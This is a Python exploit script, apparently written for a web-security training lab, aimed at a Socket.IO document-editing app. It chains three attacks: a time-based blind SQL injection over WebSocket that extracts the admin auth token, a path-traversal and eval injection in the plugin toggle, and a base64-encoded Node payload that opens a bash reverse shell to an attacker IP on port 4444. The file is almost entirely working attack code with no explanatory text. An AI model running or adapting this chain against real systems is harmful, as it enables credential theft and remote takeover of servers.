import string
import websocket
import ssl
import json
import argparse
import _thread as thread
import time
import base64
import re
import json
import subprocess
import httpx
import jaydebeapi
from concurrent.futures import ThreadPoolExecutor
from http.server import HTTPServer, SimpleHTTPRequestHandler

proxy = {
    "http://": "http://localhost:8080",
    "https://": "http://localhost:8080",
}

client = httpx.Client(
    verify=False,
    timeout=10.0,
    proxies=proxy,
)

# Config
TARGET_IP = "docedit" # add entry in /etc/hosts
TARGET_PORT = "80"
ATTACKER_IP = "192.168.45.156"
REVSHELL_PORT = "4444"
HTTPSERVER_PORT = "80"
URL = f"http://{TARGET_IP}:{TARGET_PORT}/"

if __name__ == "__main__":
    entrypoint_url = f"{URL}socket.io/?EIO=3&transport=polling&t=awae"
    res = client.get(entrypoint_url)
    assert res.status_code == 200
    sid = re.findall(r"{\"sid\":\"(.*)\",", res.text)[0]

    url = f"ws://docedit/socket.io/?EIO=3&transport=websocket&sid={sid}"
    websocket.enableTrace(False)
    ws = websocket.WebSocket()
    ws.settimeout(3)

    ws.connect(url, http_proxy_host="localhost", http_proxy_port=8080)

    ws.send("2probe")
    ws.recv()
    ws.send("5")
    ws.recv()
    ws.send('42["postLogin",{"email":"test@example.com","password":"test"}]')
    wsres = ws.recv()
    ws.recv()
    token = re.findall(r"\"token\":\"(.*)\"}]", wsres)[0]
    
    admin_token = ""
    index = 0
    letters = string.hexdigits
    while True:
        for c in letters:
            try:
                ws.send(f'42["checkEmail",{{"email":"test\' UNION SELECT CASE WHEN SUBSTRING((SELECT token from AuthTokens WHERE UserId = 1 LIMIT 1),{index+1},1)=BINARY(\'{c}\') THEN (SELECT sleep(5)) ELSE 0 END,\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\'-- -","token":"{token}"}}]')
                wsres = ws.recv()
            except websocket.WebSocketTimeoutException as e:
                wsres = ws.recv()
                admin_token += c
                index += 1
                print(admin_token)
                continue

        try: 
            ws.send(f'42["checkEmail",{{"email":"test\' UNION SELECT CASE WHEN (SELECT token from AuthTokens WHERE UserId = 1 LIMIT 1)=BINARY(\'{admin_token}\') THEN (SELECT sleep(5)) ELSE 0 END,\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\'-- -","token":"{token}"}}]')
            wsres = ws.recv()
        except websocket.WebSocketTimeoutException as e:
            wsres = ws.recv()
            print(f"[+] admin token found. : {admin_token}")
            break
    payload = base64.b64encode(f"""require("child_process").exec("bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{REVSHELL_PORT} 0>&1'")""".encode()).decode()
    print("[+] attempting reversh shell. check your terminal...")
    ws.send(f"""42["togglePlugin",{{"name":"../../node_modules/jquery')];eval(Buffer.from('{payload}','base64').toString())//","enable":true,"token":"{admin_token}"}}]""")
